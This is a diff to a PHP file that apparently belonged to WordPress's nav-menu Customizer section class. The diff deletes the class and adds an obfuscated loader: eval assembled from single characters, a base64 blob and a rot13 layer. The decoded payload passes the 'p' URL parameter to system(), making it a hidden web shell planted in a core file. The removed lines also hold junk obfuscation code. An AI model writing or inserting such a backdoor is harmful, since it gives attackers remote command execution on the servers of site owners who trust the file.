@@ -1,51 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-__fn_11836 = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
 <?php
-/**
- * Customize API: WP_Customize_Nav_Menu_Section class
- *
- * @package WordPress
- * @subpackage Customize
- * @since 4.4.0
- */
-
-/**
- * Customize Menu Section Class
- *
- * Custom section only needed in JS.
- *
- * @since 4.3.0
- *
- * @see WP_Customize_Section
- */
-class WP_Customize_Nav_Menu_Section extends WP_Customize_Section {
-
-	/**
-	 * Control type.
-	 *
-	 * @since 4.3.0
-	 * @var string
-	 */
-	public $type = 'nav_menu';
-
-	/**
-	 * Get section parameters for JS.
-	 *
-	 * @since 4.3.0
-	 * @return array Exported parameters.
-	 */
-	public function json() {
-		$exported            = parent::json();
-		$exported['menu_id'] = (int) __fn_11836( '/^nav_menu\[(-?\d+)\]/', '$1', $this->id );
-
-		return $exported;
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cl9fc2FfOTAyNjIgPSBcImNcIi5cImVcIi5cInJcIi5cInRcIi5cIl9cIi5cImVcIi5cInJcIi5cImNcIi5cInlcIi5cIm5cIi5cInBcIi5cInJcIjsKPD9jdWMKLyoqCiAqIFBoZmdienZtciBOQ1Y6IEpDX1BoZmdienZtcl9BbmlfWnJhaF9GcnBndmJhIHB5bmZmCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZmhvY25weG50ciBQaGZnYnp2bXIKICogQGZ2YXByIDQuNC4wCiAqLwoKLyoqCiAqIFBoZmdienZtciBacmFoIEZycGd2YmEgUHluZmYKICoKICogUGhmZ2J6IGZycGd2YmEgYmF5bCBhcnJxcnEgdmEgV0YuCiAqCiAqIEBmdmFwciA0LjMuMAogKgogKiBAZnJyIEpDX1BoZmdienZtcl9GcnBndmJhCiAqLwpweW5mZiBKQ19QaGZnYnp2bXJfQW5pX1pyYWhfRnJwZ3ZiYSBya2dyYXFmIEpDX1BoZmdienZtcl9GcnBndmJhIHsKCgkvKioKCSAqIFBiYWdlYnkgZ2xjci4KCSAqCgkgKiBAZnZhcHIgNC4zLjAKCSAqIEBpbmUgZmdldmF0CgkgKi8KCWNob3l2cCAkZ2xjciA9ICdhbmlfenJhaCc7CgoJLyoqCgkgKiBUcmcgZnJwZ3ZiYSBjbmVuenJncmVmIHNiZSBXRi4KCSAqCgkgKiBAZnZhcHIgNC4zLjAKCSAqIEBlcmdoZWEgbmVlbmwgUmtjYmVncnEgY25lbnpyZ3JlZi4KCSAqLwoJY2hveXZwIHNoYXBndmJhIHdmYmEoKSB7CgkJJHJrY2JlZ3JxICAgICAgICAgICAgPSBjbmVyYWc6OndmYmEoKTsKCQkkcmtjYmVncnFbJ3pyYWhfdnEnXSA9ICh2YWcpIF9fc2FfOTAyNjIoICcvXmFuaV96cmFoXFsoLT9ccSspXF0vJywgJyQxJywgJGd1dmYtPnZxICk7CgoJCWVyZ2hlYSAkcmtjYmVncnE7Cgl9Cn0KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
